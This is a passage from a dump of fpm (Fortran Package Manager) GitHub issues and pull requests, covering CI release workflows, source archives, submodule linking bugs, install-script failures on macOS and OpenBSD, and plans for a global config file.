work now; and another long-term option might be to allow you to specify the name of the build directory which also solves a problem where I might be another user who has read permission to a package but not write permission.  So if I am the other user I have to make a complete copy of the package to build it because I do not have write permission to the build directory.  git(1) is not required for fpm use, so doing a clone that way is not always possible either, and takes time and filespace.\nNote since fpm(1) already determines system type every time it runs, albeit a bit simplistically, that speed is probably not a major issue.  Maybe a compromise needs made to use an extension or conditional code, as calling uname(3c) would work on most platforms."
                },
                {
                    "user": "bitli",
                    "date": "2021-10-07 06:34:27+00:00",
                    "text": "Do we not have the same issue if we use a cross compiler ? I am currently trying to create a cross compile environment to the Raspberry PI (I know, far away of the supercomputer you guys are used to :- ) . Ideally I would like to be able to compile the same source for the local machine (during most of the development) and sometime for the target (for test or release). I did not yet try it.\nAnyhow, this is a case where detecting the current OS is not good enough to select the proper tools and rules: On the one hand we have to use the rules of the current OS (for file path for example), on the other hand we have to use the rules of the target environment (for library names and extension) and finally the rule of the specific tool (name and options of the cross compiler and linker).\nI wonder if a concept of build environment  (separate from the specification of the project and local to the builder) is not needed to support these cases."
                }
            ]
        },
        {
            "number": 569,
            "user": "awvwgk",
            "date": "2021-09-15 16:54:35+00:00",
            "title": "Add workflow for continuous delivery",
            "text": "Since our default branch is always deployable, we can easily create a continuous release which contains the latest fpm binaries and source version. This PR adds a workflow to create and move a tag called current with the head of the git repository and update the binary artifacts to the latest CI outputs.\nExample: https://github.com/awvwgk/fortran-package-manager/releases/tag/current",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-16 08:38:08+00:00",
                    "text": "@rouson, would a continuous delivery resolve #416 for you?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-09-16 08:48:09+00:00",
                    "text": "Thanks Sebastian @awvwgk, this would be very useful. Quick question: is this restricted to the main branch? I can't see anything that would prevent it running on pushes to other branches."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-16 08:51:43+00:00",
                    "text": "It will run on any push event, this includes feature branches on forks. Since we only have a single branch in the main repository this is not an issue (now), but it enables contributors to make use of building continuous releases on their forks for testing purposes. We can limit it to the main branch of course if this is a concern."
                },
                {
                    "user": "LKedward",
                    "date": "2021-11-01 16:24:04+00:00",
                    "text": "... it enables contributors to make use of building continuous releases on their forks for testing purposes\n\nI can see the benefit of this for testing, however I don't like the fact that the current tag would be dependent on which ever branch the workflow most recently ran on - or have I misunderstood this? I think we should either have a different tag per branch or restrict the workflow to only run on the default branch. What do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-11-01 18:22:29+00:00",
                    "text": "I added a dependency on a repository secret DEPLOY_BRANCH which will be used to determine whether a branch should be deployed or not. If the secret is not set no branch should be deployed. We would set it to refs/heads/main here to only deploy the default branch, but someone could set it to refs/heads at their fork to deploy all branches or to refs/heads/devel to deploy only the devel branch."
                },
                {
                    "user": "rouson",
                    "date": "2021-11-01 18:47:44+00:00",
                    "text": "@rouson, would a continuous delivery resolve #416 for you?\n\nI'm just realizing that I never responded to the above question.   I'm not familiar with continuous release, but from what is described here, yes.  I think this would solve issue. #416 for me."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-11-01 19:23:03+00:00",
                    "text": "The tag will move but the URL will remain unchanged (a nice thing about git, even tags are mutable). To overwrite the artifacts on the tag, I'm stripping the version number information from the artifacts otherwise they would pile up over time on this release."
                }
            ]
        },
        {
            "number": 566,
            "user": "wyphan",
            "date": "2021-09-10 19:01:28+00:00",
            "title": "Support for binary-only metapackages",
            "text": "Description\nIs it possible to have binary-only \"metapackages\" in fpm?\nI think this might be useful for vendor-provided closed-source packages like IBM ESSL, Intel MKL, or AMD AOCL, which can then be used as a prerequisite to provide the optimized BLAS library for building LAPACK.\nPossible Solution\nAdd a new target type, perhaps?\nSpecifically for Intel MKL on Linux, I think it can be implemented using a Bash shell script that simply looks for the MKL root directory under /opt/intel or /opt/intel/oneapi.\nA similar procedure can be done for AMD AOCL, where the library is installed under /opt/amd\nAdditional Information\nThis is actually something that the one of the LAPACK developers informed me about: it is not recommended to build LAPACK using reference BLAS, as it is slow and not optimized.",
            "comments": []
        },
        {
            "number": 565,
            "user": "awvwgk",
            "date": "2021-09-08 16:36:09+00:00",
            "title": "Default branch renaming aftermath",
            "text": "Closes #421",
            "comments": []
        },
        {
            "number": 564,
            "user": "awvwgk",
            "date": "2021-09-07 17:28:35+00:00",
            "title": "Separate upload stage in CI testing",
            "text": "Simplify CI testing workflow by creating a separate upload stage for the fpm binaries. This also allows to access the created binaries for any commit and could be used to build a continuous delivery workflow.",
            "comments": []
        },
        {
            "number": 563,
            "user": "awvwgk",
            "date": "2021-09-07 17:11:56+00:00",
            "title": "Add workflow to create single source fpm version",
            "text": "This adds the script to generate the single source file version of fpm for bootstrapping. The following steps are used to generate the bootstrap version:\n\nremove test targets from package manifest by patch (remove after #92 is resolved)\ninstall an existing binary of fpm\ncall fpm with compiler wrapper script to collect single source version\nbuild bootstrap version from single source version\nreverse patch the package manifest (remove after #92 is resolved)\nbuild fpm using the bootstrap version\nupload single source file version\n\nFinally, the single source file version is uploaded on releases.\nThis patch also changes the release workflow to run on every commit, but only upload on releases. This allows to use the created artifacts from PRs to quickly bootstrap a new fpm version with some new features implemented.\nRequires #560\nCloses #391\nCloses #559",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-07 17:19:29+00:00",
                    "text": "You can find generated single source file version here: https://github.com/fortran-lang/fpm/suites/3704688086/artifacts/90445473\nNote that links to uploaded artifacts from workflows expire quite quickly, go to the Checks tab to select the correct artifact if the link above is broken."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-13 14:45:12+00:00",
                    "text": "Thanks for reviewing. I'll go ahead and merge now."
                }
            ]
        },
        {
            "number": 562,
            "user": "awvwgk",
            "date": "2021-09-06 11:58:25+00:00",
            "title": "Add new distributions where fpm is available to README",
            "text": "MSYS2 has now a MinGW package for fpm\nSpack has now a package for fpm",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-09-13 09:40:06+00:00",
                    "text": "Thanks for reviewing Carlos @brocolis and many thanks Sebastian @awvwgk for your work getting these distributions going! I'll merge this now."
                }
            ]
        },
        {
            "number": 561,
            "user": "awvwgk",
            "date": "2021-09-05 18:43:44+00:00",
            "title": "Only compile tests for fpm test command?",
            "text": "Should we only compile the tests executables if the fpm test command is used?\nIf yes, where would we remove the tests from the compilation? Would we remove them when building the model from the manifest or should we just remove them from the targets?",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 19:09:40+00:00",
                    "text": "Duplicate of #92"
                }
            ]
        },
        {
            "number": 560,
            "user": "awvwgk",
            "date": "2021-09-05 16:34:02+00:00",
            "title": "Add release workflow to generate source archives",
            "text": "Create fpm-0.4.0.zip and fpm-0.4.0.zip.sha256 on release events and upload to release tag using git-archive command.\nCloses #559",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-08 14:56:46+00:00",
                    "text": "Closing in favor of #563, since it will include this change as well."
                }
            ]
        },
        {
            "number": 559,
            "user": "awvwgk",
            "date": "2021-09-05 16:06:37+00:00",
            "title": "Adding source tarballs to the release",
            "text": "We are currently using the automatically generated source tarballs/archives by the git-archive command. In the past those have caused issues due to changes in the git-archive command which changed the checksum of the generated tarballs and therefore broke several packaging workflows relying on git-archive generated tarballs.\nAn option would be to create an additional workflow to upload source tarballs in the release CI together with a checksum. What would be the best format here? Is everybody fine with tar.xz or tar.zst or should we use zip?\nSome package ecosystems have this as soft requirement (I was recently asked to add source tarballs to my releases to contribute a package to spack).",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-09-05 20:02:06+00:00",
                    "text": "If it has to be just one, ZIP is usually the answer not because it is best, but because it is freely available and standard on MSWindows and easily available if not installed by default on GNU/Linux, Linux, ...  I generally try to provide at least two; a ZIP and a TGZ file even though there are other great ones out there."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 20:09:34+00:00",
                    "text": "Multiple might become quite redundant in terms of build artifacts, but if there is really need we can have multiple source archives. I'll go with just zip for now."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 20:25:21+00:00",
                    "text": "For future reference, generating a couple of archives for all released tags:\nformat=zip\nfor version in $(git tag | tr -d '[:alpha:]'); do\n  git archive --prefix fpm-$version/ --format $format v$version > fpm-$version.$format\n  sha256sum fpm-$version.$format > fpm-$version.$format.sha256\ndone"
                }
            ]
        },
        {
            "number": 558,
            "user": "awvwgk",
            "date": "2021-09-04 12:45:34+00:00",
            "title": "Add issue templates",
            "text": "You can checkout the available templates here:\nhttps://github.com/awvwgk/fortran-package-manager/issues/new/choose\nProvides:\n\nIssue form for bug reports\nIssue form for packaging issues\nIssue form for feature requests\nIssue form for specification proposals\nIssue template for blank issue\nLink to fpm discussion board\nLink to Fortran-lang discourse\nLink to Fortran-lang mailing list\n\nCloses #555\nScreenshot:\nNew issue\n\n\nBug report form\n\n\nPackaging issue form\n\n\nFeature request form\n\n\nSpecification proposal form\n\n\nBlank issue",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-07 17:21:54+00:00",
                    "text": "@rouson @milancurcic Does this change look okay to you?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-08 07:02:33+00:00",
                    "text": "With two approvals I'll go ahead and merge later today."
                }
            ]
        },
        {
            "number": 557,
            "user": "awvwgk",
            "date": "2021-09-03 17:42:44+00:00",
            "title": "Update installer script to update subprojects first",
            "text": "Closes #553",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-07 17:22:31+00:00",
                    "text": "@jacobwilliams Do you have time to test this fix for the installer script?"
                },
                {
                    "user": "jacobwilliams",
                    "date": "2021-09-07 21:46:28+00:00",
                    "text": "The latest on awvwgk:install-update works for me now. Thanks!"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-08 06:59:44+00:00",
                    "text": "Thanks for testing. I'll go ahead and merge later today."
                }
            ]
        },
        {
            "number": 556,
            "user": "rouson",
            "date": "2021-09-03 01:23:01+00:00",
            "title": "Detect submodule dependencies",
            "text": "If a procedure inside an example/ subdirectory has an interface in a module and the corresponding procedure definition in a submodule (which was largely the intent when submodule became a language feature in Fortran 2008), then a linking error results.  It appears that fpm is only seeing the module dependency information captured in use statements but not in submodule statements.\nTo Do:\n\n post a reproducer later.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-04 11:55:02+00:00",
                    "text": "Thanks, can reproduce this error using the files below:\n! example/main.f90\nprogram a\n   use m\n   call p\nend program\n! example/mod.f90\nmodule m\n   interface\n      module subroutine p\n      end subroutine\n   end interface\nend module\n! example/sub.f90\nsubmodule(m) s\ncontains\n   module procedure p\n   end procedure\nend submodule\nOutput (built inside fpm tree):\n + mkdir -p build/gfortran_2A42023B310FA28D/example/\n + gfortran  -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/fpm -I build/gfortran_2A42023B310FA28D/fpm  build/gfortran_2A42023B310FA28D/fpm/example_main.f90.o build/gfortran_2A42023B310FA28D/fpm/example_mod.f90.o build/gfortran_2A42023B310FA28D/fpm/libfpm.a -o build/gfortran_2A42023B310FA28D/example/fpm-demo\n/usr/bin/ld: build/gfortran_2A42023B310FA28D/fpm/example_main.f90.o: in function `MAIN__':\n/home/awvwgk/projects/src/git/fortran-package-manager/example/main.f90:3: undefined reference to `__m_MOD_p'\ncollect2: error: ld returned 1 exit status\n<ERROR> Compilation failed for object \" fpm-demo \"\n<ERROR>stopping due to failed compilation\n\nThe link line must contain build/gfortran_2A42023B310FA28D/fpm/example_sub.f90.o otherwise this will always fail."
                }
            ]
        },
        {
            "number": 555,
            "user": "rouson",
            "date": "2021-09-02 16:47:31+00:00",
            "title": "Clicking the green \"New issue\" button doesn't start a new issue",
            "text": "See the attached screen shot.  Is this intentional?    I at first didn't notice the \"Open a blank issue\" link so the page that comes up after clicking \"New issue\" is a little confusing.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-09-02 16:50:53+00:00",
                    "text": "I think this is expected. It took some time getting used to for me as well. If I recall correctly @awvwgk made this so that users asking for help with using fpm would not open issues in the GitHub repo. If we choose to continue with this flow, we should also link to the GItHub Discussions."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-03 17:28:27+00:00",
                    "text": "We can add issue templates as well and customize the list. Will send a patch for this soon(ish)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-04 09:40:28+00:00",
                    "text": "Can you checkout this setup:\nhttps://github.com/awvwgk/fortran-package-manager/issues/new/choose"
                }
            ]
        },
        {
            "number": 554,
            "user": "oyvindyr",
            "date": "2021-09-02 07:42:47+00:00",
            "title": "Performance issue with \"fpm build\"",
            "text": "First of all: Thank you for your effort in making it easier to build Fortran programs!\nI have started experiencing with fpm and have made a small fpm project that depends on stdlib. I know fpm does not yet support building of stdlib and pre-processed code (fypp) in general. So I made a branch of stdlib where I generate .f90 files of all the .fypp files and let my project depend on this branch instead. I included a minimal .toml file and run \"fpm build\". At first I got an out-of-memory error in gfortran that I resolved by setting the MAXRANK parameter to 4 in common.fypp. Then it works!\nAs expected, building everything takes quite some time. But it also takes some time (about 10 seconds) before the compilation starts. Running fpm build again (without modifying any source code) takes again about 10 seconds before finishing, without any compilation taking place. I tried to replace the dependency to the git branch with a dependency to a local folder, but that did not help the performance issue.\nIs it the reading of all source files to sort out the dependencies that takes time? If so, it should perhaps be possible to tell fpm that no dependencies have changes since the last build? That would be useful when only making changes within a subroutine.\nI am running windows.",
            "comments": [
                {
                    "user": "zoziha",
                    "date": "2021-09-02 07:58:52+00:00",
                    "text": "If you use the latest fpm0.4.0, you should be able to feel the increase in compilation speed. The problem you mentioned is resolved in #507.\nRegarding stdlib's fpm support, I submitted a PR to stdlib yesterday, considering using github-ci to build the stdlib-fpm branch, see fortran-lang/stdlib#508."
                },
                {
                    "user": "oyvindyr",
                    "date": "2021-09-02 08:14:09+00:00",
                    "text": "Thats great! I tried fpm0.4.0 now and it is much faster indeed:-)"
                }
            ]
        },
        {
            "number": 553,
            "user": "jacobwilliams",
            "date": "2021-08-29 21:12:15+00:00",
            "title": "install.sh doesn't work on Mac",
            "text": "On an M1 Mac with Big Sur:\n> ./install.sh\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   621  100   621    0     0   2514      0 --:--:-- --:--:-- --:--:--  2524\n100  826k  100  826k    0     0  1758k      0 --:--:-- --:--:-- --:--:-- 1758k\n + gfortran -c ./src/fpm_command_line.f90 -g -fbacktrace -O3 -J build/gfortran_367ECB55A902040F/fpm -I build/gfortran_367ECB55A902040F/fpm  -o build/gfortran_367ECB55A902040F/fpm/src_fpm_command_line.f90.o\n./src/fpm_command_line.f90:30:28:\n\n   30 | use M_CLI2,           only : get_subcommand, CLI_RESPONSE_FILE\n      |                            1\nError: Symbol 'get_subcommand' referenced at (1) not found in module 'm_cli2'\n./src/fpm_command_line.f90:30:44:\n\n   30 | use M_CLI2,           only : get_subcommand, CLI_RESPONSE_FILE\n      |                                            1\nError: Symbol 'cli_response_file' referenced at (1) not found in module 'm_cli2'\n./src/fpm_command_line.f90:148:25:\n\n  148 |         CLI_RESPONSE_FILE=.true.\n      |                         1\nError: Symbol 'cli_response_file' at (1) has no IMPLICIT type\n./src/fpm_command_line.f90:149:17:\n\n  149 |         cmdarg = get_subcommand()\n      |                 1\nError: Function 'get_subcommand' at (1) has no IMPLICIT type\n <ERROR> Compilation failed for object \"src_fpm_command_line.f90.o\"\nSTOP 1",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-03 17:43:49+00:00",
                    "text": "I guess that is a stale dependency cache from a previous build. The bootstrapping process doesn't remove a previous build directory, maybe it should. An alternative is to always request an fpm update in the install script as done in #557."
                }
            ]
        },
        {
            "number": 552,
            "user": "Beliavsky",
            "date": "2021-08-29 20:46:33+00:00",
            "title": "Inviting someone to submit a package to FPM",
            "text": "Suppose you come across software that you think would be a good fit for the FPM registry (which many Fortranners are still unfamiliar with). Do you send them an email saying please consider FPM? Would it make sense for the maintainers of the FPM registry to identify a list of packages that would make good additions and develop a form letter to be sent? Such a letter could offer assistance in getting the package to work with FPM.\nThe package I have in mind is statpack, for which there is the contact information of one of the developers. There are certainly other such packages.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 10:59:36+00:00",
                    "text": "@Beliavsky there is no definite answer to this question.\nMy personal strategy is to port the project to fpm myself, try if it works as expected for me and than maybe send a patch to the upstream developers. It is safe to assume that many people don't know about fpm yet, providing a working fpm integration preferably with minimal changes and a way to test it via continuous integration to add some additional value to such contributions seems like the way to go (at least for me).\nMind that fpm is not something for everybody yet. Looking at statpack, I wonder whether you could actually use a ported version. Because fpm only supports git sources right now. For statpack we would need support for downloading and extracting the release tarballs. In this case we have to fix fpm first to support this model or you have to convince the authors that there is value in using a public git repository for their project.\nSince creating fpm projects is a decentralized process, I don't see need for having a formal process in contacting developers. Similar a list of projects we want to port to fpm could be difficult to put together, actually the whole Fortran package index would qualify, wouldn't it? I'd rather spend my time to make fpm easier to use and allow package authors to port themselves instead of investing much time in porting packages I'll probably never use."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 12:43:37+00:00",
                    "text": "I opened a poll to see what version control systems are commonly in use for Fortran projects: https://fortran-lang.discourse.group/t/1791"
                }
            ]
        },
        {
            "number": 551,
            "user": "awvwgk",
            "date": "2021-08-29 06:06:09+00:00",
            "title": "Global configuration file",
            "text": "It might be a good point to think about having a global configuration file for fpm in ~/.fpmconfig or ~/.config/fpm/config.toml. This would allow to set global options which do not affect how packages are built, but how fpm interacts with the user or environment.\nFor example it would allow to disable using environment variables in fpm for compiler detection if this is an unwanted feature for some user or to enable colored output.",
            "comments": [
                {
                    "user": "epagone",
                    "date": "2021-08-29 17:00:47+00:00",
                    "text": "This would allow to set global options which do not affect how packages are built, but how fpm interacts with the user or environment.\n\nSo if I would like to set by default a certain profile (say debug, to be overridden to release when necessary) or a certain compiler, this is not going to be the right place, correct?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-29 17:12:35+00:00",
                    "text": "So if I would like to set by default a certain profile (say debug, to be overridden to release when necessary) or a certain compiler, this is not going to be the right place, correct?\n\nAs a user specific file, settings there should not be crucial for successfully building a project. I think a default profile or compiler could be borderline, but I wouldn't rule those out completely. In any case we have to design it very carefully."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-04 11:56:34+00:00",
                    "text": "Will submit a patch for this as follow-up for #549"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-09-18 00:15:07+00:00",
                    "text": ".The metadata created by \"fpm new\" would be nice.  I was playing with a TOML file for that and got sidetracked I would like to have defaults for at least\nlicense = \"license\"\nauthor = \"Jane Doe\"\nmaintainer = \"jane.doe@example.com\"\ncopyright = \"Copyright 2021, Jane Doe\"\"\nhomepage=\"xxxxxxxxxxxxxxxx\"\n\nif that has not already been considered, and the default install directory; and I think the compiler would be nice as long as FPM_COMPILER overrides it or use of environment variables is not turned off."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-09-18 00:19:05+00:00",
                    "text": "Curious if you are thinking of serial data like fpm.toml file or something that would allow conditionals  and aliases or something like the response files too?"
                }
            ]
        },
        {
            "number": 550,
            "user": "AshyIsMe",
            "date": "2021-08-29 01:53:23+00:00",
            "title": "fpm fails to build on OpenBSD 7.0 snapshot",
            "text": "fpm currently fails to build on OpenBSD 7.0 snapshot.\n$ cd fpm\n$ git log | head -n 1\ncommit 04da9a1ce99e8fce1abdb7eb9a2073f3188038ea\n$ ./install.sh                                                                                           \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   621  100   621    0     0   1657      0 --:--:-- --:--:-- --:--:--  1664\n100  826k  100  826k    0     0   840k      0 --:--:-- --:--:-- --:--:-- 3179k\n./install.sh[67]: gfortran: not found\npuffy-lemur$ FC=egfortran ./install.sh                                                                              \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   621  100   621    0     0   5727      0 --:--:-- --:--:-- --:--:--  5858\n100  826k  100  826k    0     0  1591k      0 --:--:-- --:--:-- --:--:-- 1591k\nld: error: undefined symbol: _gfortran_os_error_at\n>>> referenced by fpm.F90:7128 (build/bootstrap/fpm.F90:7128)\n>>>               /tmp//ccqdV7RO.o:(__m_cli2_MOD_remove_l)\n>>> referenced by fpm.F90:7130 (build/bootstrap/fpm.F90:7130)\n>>>               /tmp//ccqdV7RO.o:(__m_cli2_MOD_remove_l)\n>>> referenced by fpm.F90:7130 (build/bootstrap/fpm.F90:7130)\n>>>               /tmp//ccqdV7RO.o:(__m_cli2_MOD_remove_l)\n>>> referenced 254 more times\ncollect2: error: ld returned 1 exit status\n\n\nSome details about the machine:\n$ uname -a\nOpenBSD puffy-lemur.lowtech.earth 7.0 GENERIC.MP#195 amd64\n\n$ pkg_info\nImageMagick-6.9.12.19 image processing tools\naccountsservice-0.6.42p0 D-Bus interface for user account query and manipulation\nadobe-source-code-pro-2.030p0 monospaced OpenType fonts designed for coding environments\nadwaita-icon-theme-40.1.1 base icon theme for GNOME\namtk-5.2.0          Actions, Menus and Toolbars Kit\nanthy-9100hp2       japanese input method\naom-3.1.2           Alliance for Open Media AV1 video codec\naspell-0.60.6.1p10  spell checker designed to eventually replace Ispell\nat-spi2-atk-2.38.0  atk-bridge for at-spi2\nat-spi2-core-2.40.3 service interface for assistive technologies\natk-2.36.0          accessibility toolkit used by gtk+\natk2mm-2.28.2       C++ binding for the ATK library\navahi-0.8p0         framework for Multicast DNS Service Discovery\nbabl-0.1.88         dynamic pixel format conversion library\nbaobab-40.0         directory tree analyzer for GNOME\nbash-5.1.8          GNU Bourne Again Shell\nblas-3.8.0p0        Basic Linear Algebra Subprograms\nboost-1.76.0p0      free peer-reviewed portable C++ source libraries\nbrotli-1.0.9p0      generic lossless compressor\nbzip2-1.0.8p0       block-sorting file compressor, unencumbered\ncairo-1.16.0        vector graphics library\ncairomm-1.14.3      C++ interface for cairo\ncantarell-fonts-0.301 humanist sans-serif font family\ncaribou-0.4.21p6    input assistive technology\ncaribou-gtk2-0.4.21 caribou module for GTK2\ncdparanoia-3.a9.8p4 CDDA reading utility with extra data verification features\ncdrtools-3.00p1     ISO 9660 filesystem and CD/DVD/BD creation tools\nclisp-2.49p5        ANSI Common Lisp implementation\nclucene-core-2.3.3.4p3 full-text search engine library\nclutter-1.26.4p0    OpenGL-based interactive canvas library\nclutter-gst-3.0.27p0 clutter GStreamer integration library\nclutter-gtk-1.8.4p1 GTK+ widget for clutter\ncogl-1.22.8p0       modern 3D graphics API\nconsolekit2-1.2.4   framework for defining and tracking users, sessions & seats\ncracklib-2.9.7      sensible unix password cracker\ncups-libs-2.3.3.2p0 CUPS libraries and headers\ncups-pk-helper-0.2.6p1 fine-grained privileges PolicyKit helper for CUPS\ncurl-7.78.0         transfer files with FTP, HTTP, HTTPS, etc.\ncvsps-2.1p2         generate patchsets from CVS repositories\ncyrus-sasl-2.1.27p2 RFC 2222 SASL (Simple Authentication and Security Layer)\ndav1d-0.9.1         small and fast AV1 decoder\ndb-4.6.21p7v0       Berkeley DB package, revision 4\ndbus-1.12.20p0v0    message bus system\ndbus-daemon-launch-helper-1.12.20p0 DBus setuid helper for starting system services\ndbus-glib-0.112v0   glib bindings for dbus message system\ndconf-0.40.0        configuration backend system\ndconf-editor-3.38.3 graphical dconf(1) editor\ndesktop-file-utils-0.26 utilities for dot.desktop entries\ndetex-2.8.1         strip TeX/LaTeX codes from a file\ndevhelp-40.0        API documentation browser for GNOME\ndjvulibre-3.5.27p6  view, decode and encode DjVu files\ndleyna-connector-dbus-0.4.0 dLeyna dbus connector\ndleyna-core-0.7.0   dLeyna utility functions library\ndleyna-renderer-0.7.0 service for interacting with DMRs\ndleyna-server-0.7.0 service for interacting with DMSes\ndotconf-1.3p0       simple, powerful configuration-file parser\ndvi2tty-5.3.1p0     converts .dvi files to plain text\ne2fsprogs-1.46.2p0  utilities to manipulate ext2 filesystems\nectags-5.8p5        multilanguage implementation of ctags\nemacs-27.2p1-gtk3   GNU editor: extensible, customizable, self-documenting\nenchant2-2.3.1      generic spell checking library\neog-40.3            Eye of GNOME, image viewing and cataloging program\nepiphany-40.3       GNOME web browser based on webkit\nepoll-shim-0.0.20210418 small epoll implementation using kqueue\nespeak-1.48.04p1    compact speech synthesizer\nevince-40.4         GNOME document viewer\nevolution-3.40.4    integrated email and PIM software for GNOME\nevolution-data-server-3.40.4 unified backend for PIM programs\nexempi-2.2.1p2      implementation of XMP\nexiv2-0.27.3v0      image metadata manipulation\nffcall-1.10p5       foreign function call libraries\nffmpeg-4.4p3v1      audio/video converter and streamer\nfftw3-3.3.8p1       C routines for computing the Discrete Fourier Transform\nfftw3-common-3.3.8p1 common files for the fftw3 packages\nfile-roller-3.40.0  archive manager utility for GNOME\nfirefox-91.0.1      Firefox web browser\nflac-1.3.3p0        free lossless audio codec\nfolks-0.15.3        people aggregation library\nfreerdp-2.4.0       client for Microsoft RDP (remote desktop protocol)\nfribidi-1.0.10      library implementing the Unicode Bidirectional Algorithm\nfzf-0.24.1p2        command-line fuzzy finder\ng95-11.2.0p0        GNU compiler collection: f95 compiler\ngamin-0.1.10p25     file and directory monitoring system\ngcc-11.2.0p0        GNU compiler collection: core C compiler\ngcc-libs-8.4.0p9    GNU compiler collection: support libs\ngcpio-2.13p1        GNU cpio copies files to and from archives\ngcr-3.40.0          library for bits of crypto UI and parsing\ngd-2.3.2            library for dynamic creation of images\ngdbm-1.19           GNU dbm\ngdk-pixbuf-2.42.6   image data transformation library\ngdm-40.0p4          GNOME display manager\ngedit-40.1          lightweight GNOME text editor\ngegl04-0.4.30p1     graph based image processing framework (API version 0.4)\ngeoclue2-2.4.13     modular geoinformation service on top of D-Bus\ngeocode-glib-3.26.2 convenience library for the geocoding\ngettext-runtime-0.21p1 GNU gettext runtime libraries and programs\nggrep-3.7           GNU versions of grep pattern matching utilities\nghostscript-9.07p7  GNU PostScript interpreter\nghostscript-fonts-8.11p3 35 standard PostScript fonts with Adobe name aliases\ngiflib-5.1.6        tools and library routines for working with GIF images\ngit-2.32.0          distributed version control system\ngjs-1.68.3          Javascript bindings for GNOME\nglade-3.38.2        user interface builder for the gtk+3 toolkit\nglew-2.2.0          GL Extension Wrangler library\nglib2-2.68.4        general-purpose utility library\nglib2-networking-2.68.2 network-related gio modules for GLib\nglib2mm-2.66.1      C++ interface for glib2\nglm-0.9.8.5         C++ mathematics header-only library for OpenGL software\ngmp-6.2.1           library for arbitrary precision arithmetic\ngnome-40.4          GNOME desktop meta-package (core installation)\ngnome-autoar-0.4.0  GLib wrapper around libarchive\ngnome-backgrounds-40.1 wallpapers for GNOME\ngnome-books-40.0    document and e-books manager for GNOME\ngnome-builder-3.40.2p2 IDE for GNOME\ngnome-calculator-40.1p0 GNOME desktop calculator\ngnome-calendar-40.2 GNOME calendar\ngnome-characters-40.0p0 GNOME utility to insert unusual characters\ngnome-clocks-40.0   clock application for GNOME\ngnome-connections-40.0.1 remote desktop client for GNOME\ngnome-contacts-40.0 contacts manager for GNOME\ngnome-control-center-40.0 GNOME settings\ngnome-desktop-40.4  components for the GNOME desktop\ngnome-devel-docs-40.3 developer documentation for GNOME\ngnome-dictionary-40.0 GNOME dictionary application\ngnome-documents-3.34.0p0 document manager application for GNOME\ngnome-epub-thumbnailer-1.6 thumbnailer for EPub and MOBI books\ngnome-extras-40.4   GNOME desktop meta-package (world installation)\ngnome-font-viewer-40.0 font viewer for GNOME\ngnome-icon-theme-3.12.0p5 base icon theme for GNOME\ngnome-icon-theme-symbolic-3.12.0p3 base icon theme extension for special UI contexts\ngnome-initial-setup-40.4 initial-setup firstboot-like tool\ngnome-keyring-40.0  password agent for the GNOME project\ngnome-maps-40.4     map application for GNOME\ngnome-menus-3.36.0  implementation of the FreeDesktop Desktop Menu Spec\ngnome-music-40.1.1  GNOME music playing application\ngnome-notes-40.1p1  simple note editor\ngnome-online-accounts-3.40.0 interfaces for interacting with online accounts\ngnome-online-miners-3.34.0p1 crawls through your online content\ngnome-photos-40.0   access, organize and share your photos on GNOME\ngnome-screenshot-40.0 screenshot application for GNOME\ngnome-session-40.1.1 GNOME session\ngnome-settings-daemon-40.0.1 GNOME settings daemon\ngnome-shell-40.3    next generation GNOME shell\ngnome-shell-extensions-40.3 collection of extensions for GNOME Shell\ngnome-system-monitor-40.1 sytem monitor for GNOME\ngnome-terminal-3.40.3 GNOME terminal\ngnome-themes-extra-3.28p2 extra themes for GNOME applications\ngnome-todo-40.1     simple task management application\ngnome-tour-40.0     GNOME's Tour & Greeter\ngnome-tweaks-40.0p0 customize advanced GNOME 3 options\ngnome-usage-3.38.1  system resources status\ngnome-user-docs-40.4 general user documentation for GNOME\ngnome-weather-40.1  weather application for GNOME\ngnupg-2.2.29        GNU privacy guard - a free PGP replacement\ngnutls-3.7.2        GNU Transport Layer Security library\ngobject-introspection-1.68.0 GObject Introspection\ngraphene-1.10.6     thin layer of graphic data types\ngraphite2-1.3.14    rendering for complex writing systems\ngrilo-0.3.13        framework for making media discovery and browsing easy\ngrilo-plugins-0.3.13 plugins for Grilo\ngsettings-desktop-schemas-40.0 collection of shared GSettings schemas\ngsm-1.0.19          GSM audio codec library and converter\ngsound-1.0.3        GObject library for playing system sounds\ngspell-1.8.4        spell-checking library for GTK+\ngssdp-1.2.3         API for handling SSDP resource discovery and announcement\ngstreamer1-1.18.4p0 framework for streaming media\ngstreamer1-plugins-base-1.18.4 base elements for 